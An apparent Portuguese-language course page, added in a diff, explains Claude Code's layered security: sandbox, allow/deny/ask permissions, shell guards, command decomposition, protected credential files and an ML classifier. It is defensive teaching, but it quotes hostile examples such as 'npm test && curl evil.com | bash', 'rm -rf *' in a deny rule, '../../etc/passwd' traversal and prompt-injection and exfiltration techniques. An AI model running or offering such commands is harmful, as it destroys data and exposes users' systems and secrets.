@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Módulo 2.2 — A Fortaleza: 5 Camadas de Segurança | Por Dentro do Claude Code</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            primary: '#FACC15',
+            dark: { 900: '#111827', 800: '#1f2937', 700: '#374151', 600: '#4b5563' }
+          }
+        }
+      }
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Inter', sans-serif; }
+    html:not(.dark) body { background-color: #f8fafc; }
+    html:not(.dark) .bg-dark-900 { background-color: #ffffff; }
+    html:not(.dark) .bg-dark-800 { background-color: #f9fafb; }
+    html:not(.dark) .bg-dark-700 { background-color: #f3f4f6; }
+    html:not(.dark) .bg-dark-600 { background-color: #e5e7eb; }
+    html:not(.dark) .text-neutral-100 { color: #111827; }
+    html:not(.dark) .text-neutral-300 { color: #4b5563; }
+    html:not(.dark) .text-neutral-400 { color: #6b7280; }
+    html:not(.dark) .text-neutral-500 { color: #9ca3af; }
+    html:not(.dark) .border-dark-600 { border-color: #d1d5db; }
+    html:not(.dark) .border-dark-700 { border-color: #e5e7eb; }
+    html:not(.dark) .text-blue-400 { color: #2563eb; }
+    html:not(.dark) .bg-blue-500\/20 { background-color: rgba(37, 99, 235, 0.12); }
+    html:not(.dark) .bg-blue-500\/10 { background-color: rgba(37, 99, 235, 0.08); }
+    html:not(.dark) .border-blue-500\/30 { border-color: rgba(37, 99, 235, 0.25); }
+    html:not(.dark) .hover\:bg-blue-500\/30:hover { background-color: rgba(37, 99, 235, 0.18); }
+    html:not(.dark) [class*="bg-gradient-to"] { background-image: none !important; }
+    html:not(.dark) .text-primary { color: #a16207; }
+    html:not(.dark) .bg-primary\/10 { background-color: rgba(161, 98, 7, 0.08); }
+    html:not(.dark) .border-primary\/40 { border-color: rgba(161, 98, 7, 0.25); }
+    html:not(.dark) .border-primary\/30 { border-color: rgba(161, 98, 7, 0.25); }
+    html:not(.dark) .text-sky-400 { color: #0369a1; }
+    html:not(.dark) .text-yellow-400 { color: #a16207; }
+    html:not(.dark) .hover\:text-sky-300:hover { color: #0284c7; }
+    html:not(.dark) .hover\:text-yellow-300:hover { color: #854d0e; }
+    html:not(.dark) .bg-dark-900\/95 { background-color: rgba(255, 255, 255, 0.95); }
+    html:not(.dark) .hover\:text-emerald-400:hover { color: #059669; }
+    html:not(.dark) .hover\:bg-emerald-500\/10:hover { background-color: rgba(5, 150, 105, 0.08); }
+    html:not(.dark) .hover\:text-purple-400:hover { color: #7c3aed; }
+    html:not(.dark) .hover\:bg-purple-500\/10:hover { background-color: rgba(124, 58, 237, 0.08); }
+    html:not(.dark) .bg-blue-900\/20 { background-color: rgba(37, 99, 235, 0.08); }
+    html:not(.dark) .border-blue-500\/30 { border-color: rgba(37, 99, 235, 0.25); }
+    html:not(.dark) .text-red-400 { color: #dc2626; }
+    html:not(.dark) .bg-red-900\/20 { background-color: rgba(220, 38, 38, 0.08); }
+    html:not(.dark) .border-red-500\/30 { border-color: rgba(220, 38, 38, 0.25); }
+    html:not(.dark) .text-emerald-400 { color: #059669; }
+    html:not(.dark) .bg-emerald-900\/20 { background-color: rgba(5, 150, 105, 0.08); }
+    html:not(.dark) .border-emerald-500\/30 { border-color: rgba(5, 150, 105, 0.25); }
+  </style>
+</head>
+<body class="bg-dark-900 text-neutral-100 min-h-screen">
+
+  <!-- Navigation -->
+  <nav class="sticky top-0 z-50 bg-dark-900/95 backdrop-blur-sm border-b border-dark-600">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex justify-between items-center h-14">
+        <div class="flex items-center space-x-4">
+          <a href="../../index.html" class="flex items-center space-x-2 text-yellow-400 hover:text-yellow-300">
+            <span class="text-2xl">🔍</span>
+            <span class="font-bold text-lg hidden sm:inline">Por Dentro do Claude Code</span>
+          </a>
+          <span class="text-neutral-600">|</span>
+          <a href="https://github.com/nileedu" target="_blank" class="text-sky-400 hover:text-sky-300 text-sm font-medium">nileedu</a>
+        </div>
+        <div class="flex items-center space-x-1 sm:space-x-2">
+          <a href="../trilha1/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-emerald-400 hover:bg-emerald-500/10 transition-colors">
+            <span class="sm:hidden">T1</span><span class="hidden sm:inline">Fundamentos</span>
+          </a>
+          <a href="index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-blue-400 bg-blue-500/10">
+            <span class="sm:hidden">T2</span><span class="hidden sm:inline">Núcleo</span>
+          </a>
+          <a href="../trilha3/index.html" class="px-3 py-1.5 rounded-lg text-sm font-semibold text-neutral-400 hover:text-purple-400 hover:bg-purple-500/10 transition-colors">
+            <span class="sm:hidden">T3</span><span class="hidden sm:inline">Avançado</span>
+          </a>
+          <button id="theme-toggle" class="p-2 rounded-lg bg-dark-700 hover:bg-dark-600 transition-colors ml-2">
+            <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg>
+            <svg id="theme-toggle-light-icon" class="hidden w-5 h-5 text-neutral-300" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path></svg>
+          </button>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Breadcrumb -->
+  <nav class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
+    <div class="flex items-center space-x-2 text-sm text-neutral-400">
+      <a href="../../index.html" class="hover:text-blue-400">Início</a>
+      <span>/</span>
+      <a href="index.html" class="hover:text-blue-400">Trilha 2</a>
+      <span>/</span>
+      <span class="text-blue-400">Módulo 2.2</span>
+    </div>
+  </nav>
+
+  <!-- Header -->
+  <header class="bg-gradient-to-br from-blue-900/30 via-dark-800 to-dark-800 py-12 border-b border-dark-600">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+      <span class="inline-block px-3 py-1 bg-blue-500/20 text-blue-400 text-xs font-semibold rounded-full mb-4">MÓDULO 2.2</span>
+      <h1 class="text-3xl sm:text-4xl font-bold mb-4">🛡️ A Fortaleza: 5 Camadas de Segurança</h1>
+      <p class="text-lg text-neutral-400 max-w-3xl">Cinco muralhas concêntricas protegem seu código — da sandbox externa ao classificador ML. O Claude Code executa comandos shell e edita arquivos, e esse nível de poder exige defesas sérias.</p>
+      <div class="grid grid-cols-4 gap-4 mt-8 max-w-2xl">
+        <div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600">
+          <div class="text-xl font-bold text-blue-400">6</div>
+          <div class="text-xs text-neutral-400">Tópicos</div>
+        </div>
+        <div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600">
+          <div class="text-xl font-bold text-blue-400">30</div>
+          <div class="text-xs text-neutral-400">Minutos</div>
+        </div>
+        <div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600">
+          <div class="text-xl font-bold text-blue-400">Intermediário</div>
+          <div class="text-xs text-neutral-400">Nível</div>
+        </div>
+        <div class="bg-dark-800/50 rounded-lg p-3 border border-dark-600">
+          <div class="text-xl font-bold text-blue-400">Teoria</div>
+          <div class="text-xs text-neutral-400">Tipo</div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 1 -->
+    <!-- ============================================================ -->
+    <section id="topico-1" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">1</span>
+        <h2 class="text-2xl font-bold">🏰 Sandbox — A Primeira Muralha</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">A primeira linha de defesa do Claude Code é o isolamento físico. Antes mesmo de avaliar se um comando é seguro, o sistema garante que a execução acontece dentro de um ambiente restrito — a sandbox. Comandos não têm acesso irrestrito ao sistema operacional; eles rodam em um container limitado que restringe acesso a rede, sistema de arquivos e processos.</p>
+
+      <!-- Diagram -->
+      <div class="my-8 rounded-xl overflow-hidden border border-dark-600">
+        <img src="../../doc/claude_code_arquitetura_pt_br/claude_code_imgs/diagrama_seguranca_pt.png" alt="Diagrama das 5 camadas de segurança do Claude Code" class="w-full">
+        <div class="p-4 bg-dark-800 text-sm text-neutral-400">As cinco camadas concêntricas de segurança do Claude Code — da sandbox externa ao classificador ML interno.</div>
+      </div>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">O Que é a Sandbox</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Isolamento de processos:</strong> Comandos executados pelo Claude Code rodam em um ambiente confinado, sem acesso direto ao sistema hospedeiro</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Restrição de rede:</strong> A sandbox pode limitar ou bloquear conexões de rede, impedindo exfiltração de dados</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Acesso ao filesystem controlado:</strong> Apenas os diretórios do projeto são acessíveis — não o sistema inteiro</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Defesa em profundidade:</strong> Mesmo que todas as outras camadas falhem, a sandbox limita o dano potencial</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box: Dica Prática -->
+      <div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+        <h3 class="text-lg font-bold text-primary mb-3">💡 Como Funciona na Prática</h3>
+        <p class="text-neutral-300 leading-relaxed">No macOS, a sandbox usa o recurso nativo <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">sandbox-exec</code> com perfis restritivos. No Linux, mecanismos como namespaces e cgroups podem ser utilizados. O ponto-chave: você não precisa configurar nada — a sandbox é ativada automaticamente quando disponível. Pense nela como a muralha externa de um castelo: ela está sempre lá, mesmo que você não a veja.</p>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 2 -->
+    <!-- ============================================================ -->
+    <section id="topico-2" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">2</span>
+        <h2 class="text-2xl font-bold">🔐 Sistema de Permissões — Allow, Deny e Ask</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">A segunda camada é o sistema de permissões granular. Cada ferramenta do Claude Code — Bash, Edit, Read, Write — pode ser individualmente configurada para rodar automaticamente, ser bloqueada ou pedir aprovação explícita. Isso é configurável via <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">settings.json</code> e suporta wildcards para automação inteligente.</p>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">Os 3 Níveis de Permissão</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Allow (Permitir):</strong> A ferramenta executa automaticamente sem pedir confirmação. Ideal para operações seguras como leitura de arquivos ou comandos de build conhecidos. Exemplo: <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">"Bash(npm test)"</code></p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Deny (Bloquear):</strong> A ferramenta é completamente bloqueada. O Claude Code nem tenta executar. Útil para comandos destrutivos que nunca devem rodar. Exemplo: <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">"Bash(rm -rf *)"</code></p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Ask (Perguntar):</strong> O padrão para a maioria das operações. O Claude Code pausa e pede sua aprovação antes de executar. Você vê exatamente o que será executado e decide se permite ou não</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Grid: Fazer vs Evitar -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+        <div class="bg-emerald-900/20 rounded-xl border border-emerald-500/30 p-6">
+          <h3 class="text-lg font-bold text-emerald-400 mb-4 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+            Fazer
+          </h3>
+          <ul class="space-y-3">
+            <li class="flex items-start space-x-2">
+              <span class="text-emerald-400 mt-0.5">&#10003;</span>
+              <span class="text-neutral-300">Usar wildcards para permitir padrões seguros: <code class="bg-dark-700 px-1 rounded text-xs">Bash(npm *)</code></span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-emerald-400 mt-0.5">&#10003;</span>
+              <span class="text-neutral-300">Configurar permissões por projeto no <code class="bg-dark-700 px-1 rounded text-xs">.claude/settings.json</code> local</span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-emerald-400 mt-0.5">&#10003;</span>
+              <span class="text-neutral-300">Bloquear explicitamente comandos destrutivos conhecidos</span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-emerald-400 mt-0.5">&#10003;</span>
+              <span class="text-neutral-300">Revisar e ajustar permissões conforme confiança aumenta</span>
+            </li>
+          </ul>
+        </div>
+        <div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6">
+          <h3 class="text-lg font-bold text-red-400 mb-4 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            Evitar
+          </h3>
+          <ul class="space-y-3">
+            <li class="flex items-start space-x-2">
+              <span class="text-red-400 mt-0.5">&#10007;</span>
+              <span class="text-neutral-300">Aprovar tudo cegamente com <code class="bg-dark-700 px-1 rounded text-xs">Bash(*)</code> no allow</span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-red-400 mt-0.5">&#10007;</span>
+              <span class="text-neutral-300">Ignorar as solicitações de permissão — elas existem por um motivo</span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-red-400 mt-0.5">&#10007;</span>
+              <span class="text-neutral-300">Usar as mesmas permissões para todos os projetos</span>
+            </li>
+            <li class="flex items-start space-x-2">
+              <span class="text-red-400 mt-0.5">&#10007;</span>
+              <span class="text-neutral-300">Permitir comandos de rede sem restrição em projetos sensíveis</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 3 -->
+    <!-- ============================================================ -->
+    <section id="topico-3" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">3</span>
+        <h2 class="text-2xl font-bold">🛡️ Guardas da BashTool — 23+ Verificações Contra Shell Malicioso</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">O shell é o maior vetor de ataque em qualquer sistema de agentes de IA. Um comando shell aparentemente inocente pode esconder substituições de comando, injeções de variáveis, caracteres Unicode invisíveis e dezenas de outros truques. A BashTool do Claude Code implementa mais de 23 verificações específicas para neutralizar essas ameaças.</p>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">O Que os Guardas Bloqueiam</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Substituição de comando <code class="bg-dark-700 px-1 rounded text-xs">$()</code>:</strong> Previne execução aninhada de comandos arbitrários dentro de strings</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Zsh perigosos:</strong> Bloqueia <code class="bg-dark-700 px-1 rounded text-xs">zmodload</code>, <code class="bg-dark-700 px-1 rounded text-xs">sysopen</code>, <code class="bg-dark-700 px-1 rounded text-xs">zsystem</code> e outros builtins que acessam recursos do sistema</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Flags ofuscadas:</strong> Detecta flags escritas de formas alternativas para burlar detecção (ex: <code class="bg-dark-700 px-1 rounded text-xs">-\-force</code> com escape)</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">IFS injection:</strong> Bloqueia manipulação do Internal Field Separator para alterar parsing de comandos</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Unicode whitespace:</strong> Detecta caracteres Unicode invisíveis que parecem espaços mas alteram semântica</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Control chars:</strong> Bloqueia caracteres de controle que podem manipular o terminal ou alterar output</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Pipe para shell:</strong> Previne padrões como <code class="bg-dark-700 px-1 rounded text-xs">curl url | bash</code> que baixam e executam código arbitrário</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Redireção perigosa:</strong> Bloqueia redireção de output para arquivos sensíveis do sistema</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box: Alerta -->
+      <div class="bg-red-900/20 rounded-xl border border-red-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-red-400 mb-3">🚨 Por Que Shell é o Maior Vetor de Ataque</h3>
+        <p class="text-neutral-300 leading-relaxed mb-4">O shell é Turing-completo e incrivelmente expressivo. Um único comando pode baixar código da internet, executá-lo, modificar arquivos do sistema e exfiltrar dados — tudo em uma linha. Atacantes sofisticados usam técnicas como:</p>
+        <div class="space-y-2">
+          <div class="flex items-start space-x-3">
+            <span class="text-red-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Prompt injection:</strong> Inserir instruções maliciosas em arquivos que o Claude Code lê, fazendo-o executar comandos perigosos</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-red-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Obfuscação multi-camada:</strong> Codificar comandos em base64, hex, ou usar variáveis de ambiente para esconder intenção</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-red-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Exfiltração via DNS/HTTP:</strong> Enviar dados sensíveis codificados em requisições aparentemente inocentes</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 4 -->
+    <!-- ============================================================ -->
+    <section id="topico-4" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">4</span>
+        <h2 class="text-2xl font-bold">🔍 Análise de Comando — Decomposição e Verificação Independente</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">Comandos compostos são uma das formas mais comuns de burlar verificações de segurança. Um comando como <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">npm test && curl evil.com | bash</code> poderia passar despercebido se apenas o primeiro subcomando fosse verificado. O Claude Code resolve isso decompondo cada comando composto e verificando cada parte independentemente.</p>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">Como a Decomposição Funciona</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Parsing de operadores:</strong> <code class="bg-dark-700 px-1 rounded text-xs">&&</code>, <code class="bg-dark-700 px-1 rounded text-xs">||</code>, <code class="bg-dark-700 px-1 rounded text-xs">;</code>, <code class="bg-dark-700 px-1 rounded text-xs">|</code> — cada operador divide o comando em subcomandos separados</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Verificação individual:</strong> Cada subcomando passa independentemente por todas as verificações de segurança</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Falha atômica:</strong> Se qualquer subcomando falhar na verificação, o comando inteiro é bloqueado — não há execução parcial</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Subshells incluídos:</strong> Expressões dentro de <code class="bg-dark-700 px-1 rounded text-xs">()</code> e <code class="bg-dark-700 px-1 rounded text-xs">{}</code> também são analisadas recursivamente</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box: Dica Prática -->
+      <div class="bg-primary/10 rounded-xl border border-primary/40 p-6 mb-6">
+        <h3 class="text-lg font-bold text-primary mb-3">💡 Na Prática</h3>
+        <p class="text-neutral-300 leading-relaxed">Quando o Claude Code precisa executar <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">cd project && npm install && npm test</code>, ele não avalia o comando como um bloco único. Ele divide em três partes — <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">cd project</code>, <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">npm install</code> e <code class="bg-dark-700 px-1.5 py-0.5 rounded text-sm">npm test</code> — e verifica cada um contra todas as regras de segurança. Isso significa que esconder um comando perigoso no meio de uma cadeia de comandos seguros não funciona.</p>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 5 -->
+    <!-- ============================================================ -->
+    <section id="topico-5" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">5</span>
+        <h2 class="text-2xl font-bold">🏛️ Código Protegido — A Fortaleza Interna</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">Todas as camadas anteriores convergem para um único objetivo: proteger seu código e suas credenciais. Além das defesas genéricas, o Claude Code implementa proteções específicas contra vetores de ataque conhecidos — incluindo vulnerabilidades exclusivas de plataforma como vazamento NTLM no Windows.</p>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">Proteções da Fortaleza Interna</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Proteção UNC (Windows):</strong> Caminhos UNC como <code class="bg-dark-700 px-1 rounded text-xs">\\server\share</code> podem forçar autenticação NTLM automática, vazando hashes de senha. O Claude Code detecta e bloqueia esses caminhos</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Bloqueio de credenciais em URLs:</strong> URLs no formato <code class="bg-dark-700 px-1 rounded text-xs">https://user:password@host</code> são detectadas e bloqueadas para evitar vazamento de credenciais</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Proteção de arquivos sensíveis:</strong> Acesso a <code class="bg-dark-700 px-1 rounded text-xs">.env</code>, <code class="bg-dark-700 px-1 rounded text-xs">.ssh/</code>, <code class="bg-dark-700 px-1 rounded text-xs">credentials.json</code> e similares é sinalizado ou bloqueado</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Validação de paths:</strong> Caminhos com traversal (<code class="bg-dark-700 px-1 rounded text-xs">../../etc/passwd</code>) são detectados e impedidos</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Box: Dados -->
+      <div class="bg-blue-900/20 rounded-xl border border-blue-500/30 p-6 mb-6">
+        <h3 class="text-lg font-bold text-blue-400 mb-4">📊 Lista de Proteções Específicas</h3>
+        <div class="space-y-3">
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Caminhos UNC:</strong> Detecção de <code class="bg-dark-700 px-1 rounded text-xs">\\</code> no início de caminhos em ambiente Windows</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Credenciais em URL:</strong> Regex para detectar <code class="bg-dark-700 px-1 rounded text-xs">://user:pass@</code> em qualquer contexto</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Tokens e chaves:</strong> Padrões de API keys (AWS, GitHub, Anthropic) são detectados e mascarados</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Path traversal:</strong> Sequências <code class="bg-dark-700 px-1 rounded text-xs">../</code> que escapam do diretório do projeto são bloqueadas</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Symlink attacks:</strong> Links simbólicos que apontam para fora do projeto são verificados</p>
+          </div>
+          <div class="flex items-start space-x-3">
+            <span class="text-blue-400 mt-1">&#9679;</span>
+            <p class="text-neutral-300"><strong class="text-neutral-100">Arquivo de configuração shell:</strong> Escrita em <code class="bg-dark-700 px-1 rounded text-xs">.bashrc</code>, <code class="bg-dark-700 px-1 rounded text-xs">.zshrc</code>, <code class="bg-dark-700 px-1 rounded text-xs">.profile</code> é bloqueada para evitar persistência</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- TOPIC 6 -->
+    <!-- ============================================================ -->
+    <section id="topico-6" class="mb-16">
+      <div class="flex items-center space-x-4 mb-6">
+        <span class="flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/20 text-blue-400 font-bold text-xl">6</span>
+        <h2 class="text-2xl font-bold">🤖 Classificador ML — Aprovação Semântica com Inteligência</h2>
+      </div>
+      <p class="text-neutral-300 mb-6 leading-relaxed">A camada mais sofisticada. Enquanto as outras verificações usam regras estáticas (regex, listas de bloqueio, parsing), o classificador ML entende a intenção semântica do comando. Ele não olha apenas para os caracteres — ele compreende o que o comando pretende fazer. Além disso, a Anthropic mantém uma API de lista de bloqueio para URLs maliciosas conhecidas.</p>
+
+      <!-- Box: Conceito Principal -->
+      <div class="bg-gradient-to-br from-blue-900/40 via-dark-800 to-dark-800 rounded-xl border border-blue-500/30 p-6 mb-6">
